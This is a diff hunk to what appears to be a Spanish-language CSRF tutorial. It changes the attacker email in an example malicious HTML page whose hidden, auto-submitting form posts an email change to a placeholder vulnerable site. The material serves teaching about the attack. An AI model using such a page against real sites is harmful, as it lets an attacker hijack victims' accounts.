@@ -54,7 +54,7 @@ El atacante puede crear una página HTML maliciosa como esta:
 <html>
   <body>
     <form action="https://vulnerable-website.com/email/change" method="POST">
-      <input type="hidden" name="email" value="attacker@example.com">
+      <input type="hidden" name="email" value="pwned@evil-user.net">
     </form>
     <script>
       document.forms[0].submit();
